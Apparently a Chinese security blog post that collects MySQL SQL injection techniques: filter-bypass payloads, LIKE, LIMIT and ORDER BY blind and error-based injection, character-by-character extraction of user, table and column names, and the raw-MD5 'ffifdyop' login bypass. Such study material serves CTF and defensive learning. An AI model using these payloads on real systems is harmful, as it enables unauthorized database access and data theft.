<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-2d89a0118547c34c.png" alt="image.png"></p>
<h2 id="奇淫技巧"><a href="#奇淫技巧" class="headerlink" title="奇淫技巧"></a>奇淫技巧</h2><p>通常注入利用的姿势不是靠一个点就可以突破的，往往需要结合许多姿势技巧</p>
<p>mysql的注入过程中，我们用得到的一些：<br>常量：<code>true， false， null， \N, current_timestamp</code><br>变量：<code>@myvar:=1</code></p>
<p>系统变量：<code>@@version, @@datadir....</code></p>
<p>常用函数：<code>version(), pi(), pow(), char(), substring()</code></p>
<p>字符串生成：<code>hex(), conv()</code></p>
<p> 有关于字符串生成的一些基础字符(其余的字符可以由此扩展)：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">true</span><span class="operator">=</span><span class="number">1</span>,<span class="built_in">floor</span>(pi())<span class="operator">=</span><span class="number">3</span>,<span class="built_in">ceil</span>(pi())<span class="operator">=</span><span class="number">4</span>,<span class="built_in">floor</span>(version())<span class="operator">=</span><span class="number">5</span>,<span class="built_in">ceil</span>(version())<span class="operator">=</span><span class="number">6</span></span><br></pre></td></tr></table></figure>

<h3 id="1、过滤的绕过"><a href="#1、过滤的绕过" class="headerlink" title="1、过滤的绕过"></a>1、过滤的绕过</h3><p>过滤空格：<code>%20, %09, %0a, %0b, %0c, %0d, %a0，还有一些可以利用括号或者注释</code></p>
<p>过滤and，or：||，&amp;&amp;</p>
<p>union select：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用括号，<span class="string">&#x27;and(true)like(false)union(select(pass)from(users))，</span></span><br><span class="line"><span class="string">方括号union [all|distinct] select pass from users#，</span></span><br><span class="line"><span class="string">union%a0select pass from users，</span></span><br><span class="line"><span class="string">或者内联注释union/*&amp;sort=*/select pass from users#</span></span><br></pre></td></tr></table></figure>

<p>union：<code>子查询进行盲注and length((select pass from users having substr(pass,1,1)=&#39;a&#39;))</code></p>
<p>having：<code>and(select substr(group_concat(pass),1,1)from users)=&#39;a</code></p>
<p>select … from(过滤代码如&#x2F;SELECT\s+[A-Za-z.]+\s+FROM&#x2F;i&#x2F;i)：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> [<span class="keyword">all</span><span class="operator">|</span><span class="keyword">distinct</span>] pass <span class="keyword">from</span> users</span><br><span class="line"><span class="keyword">select</span>`table_name`<span class="keyword">from</span>`information_schema` . `tables`</span><br><span class="line"><span class="keyword">select</span> pass <span class="keyword">as</span> alias <span class="keyword">from</span> users</span><br><span class="line"><span class="keyword">select</span> pass aliasalias <span class="keyword">from</span> users</span><br><span class="line"><span class="keyword">select</span> pass`alias alias`<span class="keyword">from</span> users</span><br><span class="line"><span class="keyword">select</span><span class="operator">+</span>pass<span class="operator">%</span>a0from(users)</span><br></pre></td></tr></table></figure>

<p>and,&amp;,or,|：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里就是可以利用上文中提到的<span class="literal">false</span>注入的方式进行绕过</span><br><span class="line">可以通过字符串比较引入查询</span><br><span class="line">譬如<span class="string">&#x27;=1=(select .....)</span></span><br></pre></td></tr></table></figure>

<p>过滤逗号：<code>&#39; and substr(data from 1 for 1) = &#39;a&#39;#</code></p>
<h3 id="2、技巧"><a href="#2、技巧" class="headerlink" title="2、技巧"></a>2、技巧</h3><h3 id="2-1、like"><a href="#2-1、like" class="headerlink" title="2.1、like"></a>2.1、like</h3><p>有时候我们可以利用一些逻辑语句进行注入例如在最近的0ctf上的Temmo’s Tiny Shop这个题中，我们在搜索的时候推测出语句是在like后的，就可以通过left来进行like盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((<span class="keyword">select</span>(<span class="keyword">left</span>((<span class="keyword">select</span>(flag)<span class="keyword">from</span>(ce63e444b0d049e9c899c9a0336b3c59)),<span class="number">3</span>))<span class="keyword">like</span>(<span class="number">0x2562</span>)),name,price)</span><br></pre></td></tr></table></figure>

<h3 id="2-2、Limt"><a href="#2-2、Limt" class="headerlink" title="2.2、Limt"></a>2.2、Limt</h3><p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO是需要写的权限。</p>
<p>利用PROCEDURE 有两种方式，基于报错和时间的，具体文章见这里<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法</a></p>
<p><strong>此方法适用于MySQL 5.x中，在limit语句后面的注入</strong></p>
<blockquote>
<p>下面的语句包含了ORDER BY，MySQL当中UNION语句不能在ORDER BY的后面</p>
<p><strong>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。</strong></p>
</blockquote>
<p>基于报错：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> field <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> id <span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>基于时间：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> id <span class="operator">&gt;</span> <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(IF(MID(version(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, BENCHMARK(<span class="number">5000000</span>,SHA1(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="2-3、order-by"><a href="#2-3、order-by" class="headerlink" title="2.3、order by"></a>2.3、order by</h3><p>order by 后的数字可以作为一个注入点。具体可以看这个文章<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/57197.html">MySQL Order By 注入总结</a></p>
<p>这里可以用一些判断和返回值进行利用，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,name,price) 通过name字段排序</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IF(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,name,price) 通过price字段排序</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>name<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>price<span class="operator">+</span><span class="keyword">END</span>) 通过name字段排序</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>name<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>price<span class="operator">+</span><span class="keyword">END</span>) 通过price字段排序</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IFNULL(<span class="keyword">NULL</span>,price) 通过price字段排序</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IFNULL(<span class="keyword">NULL</span>,name) 通过name字段排序</span><br></pre></td></tr></table></figure>

<p>还可以用rand函数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>rand(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>)</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>rand(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>通常这里我们是不知道列名的，那可以通过报错进行利用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>information_schema.tables)) 正常</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IF(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>information_schema.tables)) 错误</span><br><span class="line"></span><br><span class="line">利用regexp</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 正常</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 错误</span><br><span class="line"></span><br><span class="line">利用updatexml</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>updatexml(<span class="number">1</span>,if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,<span class="keyword">user</span>()),<span class="number">1</span>) 正确</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>updatexml(<span class="number">1</span>,if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,<span class="keyword">user</span>()),<span class="number">1</span>) 错误</span><br><span class="line"></span><br><span class="line">利用extractvalue</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>extractvalue(<span class="number">1</span>,if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,<span class="keyword">user</span>())) 正确</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>extractvalue(<span class="number">1</span>,if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,<span class="keyword">user</span>())) 错误</span><br><span class="line"></span><br><span class="line">利用sleep</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,(<span class="keyword">SELECT</span>(<span class="number">1</span>)<span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(SLEEP(<span class="number">2</span>)))test)) 正常响应时间</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">SELECT</span>(<span class="number">1</span>)<span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(SLEEP(<span class="number">2</span>)))test)) sleep <span class="number">2</span>秒</span><br><span class="line"></span><br><span class="line">数据猜解</span><br><span class="line">通过下可以得知<span class="keyword">user</span>()第一位为r,ascii码的<span class="number">16</span>进制为<span class="number">0x72</span>：</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x72</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 正确</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x71</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 错误</span><br><span class="line">猜解当前数据库的表名：</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>((<span class="keyword">select</span><span class="operator">+</span>concat(table_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.tables<span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span></span><br><span class="line">table_schema<span class="operator">%</span><span class="number">3</span>ddatabase()<span class="operator">+</span>limit<span class="operator">+</span><span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x67</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 正确</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>((<span class="keyword">select</span><span class="operator">+</span>concat(table_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.tables<span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span></span><br><span class="line">table_schema<span class="operator">%</span><span class="number">3</span>ddatabase()<span class="operator">+</span>limit<span class="operator">+</span><span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x66</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 错误</span><br><span class="line">猜解指定表名中的列名：</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>((<span class="keyword">select</span><span class="operator">+</span>concat(column_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.columns</span><br><span class="line"><span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span>table_schema<span class="operator">%</span><span class="number">3</span>ddatabase()<span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>table_name<span class="operator">%</span><span class="number">3</span>d0x676f6f6473<span class="operator">+</span>limit<span class="operator">+</span><span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x69</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 正常</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>((<span class="keyword">select</span><span class="operator">+</span>concat(column_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.columns</span><br><span class="line"><span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span>table_schema<span class="operator">%</span><span class="number">3</span>ddatabase()<span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>table_name<span class="operator">%</span><span class="number">3</span>d0x676f6f6473<span class="operator">+</span>limit<span class="operator">+</span><span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x68</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 错误</span><br></pre></td></tr></table></figure>

<h3 id="3、有关函数"><a href="#3、有关函数" class="headerlink" title="3、有关函数"></a>3、有关函数</h3><h3 id="3-1-不常用函数绕过滤"><a href="#3-1-不常用函数绕过滤" class="headerlink" title="3.1 不常用函数绕过滤"></a>3.1 不常用函数绕过滤</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lpad(data,<span class="number">1</span>,space(<span class="number">1</span>)) <span class="operator">/</span><span class="operator">/</span> lpad(<span class="string">&#x27;hi&#x27;</span>,<span class="number">4</span>,<span class="string">&#x27;?&#x27;</span>) <span class="operator">=</span> <span class="string">&#x27;??hi&#x27;</span></span><br><span class="line">rpad(data,<span class="number">1</span>,space(<span class="number">1</span>)) <span class="operator">/</span><span class="operator">/</span> rpad(<span class="string">&#x27;hi&#x27;</span>,<span class="number">4</span>,<span class="string">&#x27;?&#x27;</span>) <span class="operator">=</span> <span class="string">&#x27;hi??&#x27;</span></span><br><span class="line"><span class="keyword">left</span>(data,<span class="number">1</span>)</span><br><span class="line">reverse(<span class="keyword">right</span>(reverse(data),<span class="number">1</span>))</span><br><span class="line"><span class="keyword">insert</span>(<span class="keyword">insert</span>(version(),<span class="number">1</span>,<span class="number">0</span>,space(<span class="number">0</span>)),<span class="number">2</span>,<span class="number">222</span>,space(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<h3 id="3-2-搜索匹配类的函数"><a href="#3-2-搜索匹配类的函数" class="headerlink" title="3.2 搜索匹配类的函数"></a>3.2 搜索匹配类的函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;-if(locate(&#x27;</span>f<span class="string">&#x27;,data),1,0)#</span></span><br><span class="line"><span class="string">&#x27;</span><span class="operator">-</span>if(locate(<span class="string">&#x27;fo&#x27;</span>,data),<span class="number">1</span>,<span class="number">0</span>)#</span><br><span class="line"><span class="string">&#x27;-if(locate(&#x27;</span>foo<span class="string">&#x27;,data),1,0)#</span></span><br><span class="line"><span class="string">instr(), position()</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3、一些数学函数"><a href="#3-3、一些数学函数" class="headerlink" title="3.3、一些数学函数"></a>3.3、一些数学函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、format(x,y)  函数，功能是将一个数字x，保留y位小数，并且整数部分用逗号分隔千分位，小数部分四舍五入。</span><br><span class="line"><span class="number">2</span>、<span class="built_in">abs</span>();  求一个数的绝对值；absolute</span><br><span class="line"><span class="number">3</span>、<span class="built_in">sqrt</span>();求一个数的平方根。sqrt是sqruar(平方，矩形) ，root（根）的缩写。</span><br><span class="line"><span class="number">4</span>、<span class="built_in">mod</span>(x,y)  x除数，y被除数。结束是余数。</span><br><span class="line"><span class="number">5</span>、<span class="built_in">ceil</span>()  进一取整。<span class="built_in">floor</span>()舍一取整</span><br><span class="line">这两个函数是镜子函数，比较有点意思。这两个函数并不进行四舍五入，比较强硬。</span><br><span class="line"><span class="number">6</span>、rand()  顾名思义，是用来生成随机数用的。种子不变数值不变。</span><br><span class="line"><span class="number">7</span>、format 会自动进行千分位，下面我们来看看round函数，进行四舍五入。</span><br><span class="line"><span class="number">8</span>、<span class="keyword">truncate</span>(x,y)  比较霸道，不管四舍五入，直接把x，的y位小数直接干掉。</span><br><span class="line"><span class="number">9</span>、sign() 返回当前结果得符号，如果是负数返回<span class="number">-1</span>，如果是<span class="number">0</span> 返回<span class="number">0</span> 如果是正数，返回<span class="number">1.</span></span><br><span class="line"><span class="number">10</span>、<span class="built_in">power</span>()  幂运算</span><br><span class="line"><span class="number">11.</span><span class="built_in">SIN</span>(X)、<span class="built_in">ASIN</span>(X)、<span class="built_in">COS</span>(X)、<span class="built_in">ACOS</span>(X)、<span class="built_in">TAN</span>(X)、<span class="built_in">ATAN</span>(X)、COT(X)  三角函数</span><br><span class="line"><span class="number">12.</span>RADIANS(X) 和 DEGREES(X): 角度与弧度转换函数</span><br><span class="line"><span class="number">13.</span> <span class="built_in">LOG</span>(X)和<span class="built_in">LOG10</span>(X): 对数运算函数</span><br><span class="line"><span class="number">14.</span> POW(X,Y), <span class="built_in">POWER</span>(X,Y)和<span class="built_in">EXP</span>(X)</span><br></pre></td></tr></table></figure>

<h3 id="3-4、使用函数进行字符串的切割"><a href="#3-4、使用函数进行字符串的切割" class="headerlink" title="3.4、使用函数进行字符串的切割"></a>3.4、使用函数进行字符串的切割</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">length(<span class="built_in">trim</span>(<span class="keyword">leading</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">FROM</span> data)) # length will be shorter</span><br><span class="line">length(replace(data, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) # length will be shorter</span><br></pre></td></tr></table></figure>

<h3 id="3-5、字符串连接"><a href="#3-5、字符串连接" class="headerlink" title="3.5、字符串连接"></a>3.5、字符串连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#x27;|&#x27;,&#x27;11&#x27;,&#x27;22&#x27;,&#x27;33&#x27;);//11|22|33</span><br><span class="line">select concat(&#x27;11&#x27;,&#x27;22&#x27;,&#x27;33&#x27;);//112233</span><br><span class="line">select &quot;a&quot;&#x27;d&#x27;&quot;m&quot;&#x27;i&#x27;&quot;n&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="4-关于php中md5的一个有意思的小技巧"><a href="#4-关于php中md5的一个有意思的小技巧" class="headerlink" title="4 关于php中md5的一个有意思的小技巧"></a>4 关于php中md5的一个有意思的小技巧</h3><p>PHP中这么一段sql语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM admin WHERE pass = &#x27;&quot;.md5($password,<span class="literal">true</span>).&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>这里是可以注入绕过的，在php关于<a target="_blank" rel="noopener" href="http://php.net/manual/en/function.md5.php">MD5函数</a>的介绍说</p>
<p>如果可选的 <code>raw_output</code> 被设置为 <strong>TRUE</strong>，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p>
<p>也就是找到一个字符串MD5的二进制恰好和字符编码中的某些编码对上了，就可以产生注入，原文作者找到这么一串字符串<code>ffifdyop</code>,md5加密后对应字符编码刚好是<code>&#39;or&#39;&lt;trash&gt;</code>,便产生注入</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes">原文在这</a></p>
</blockquote>
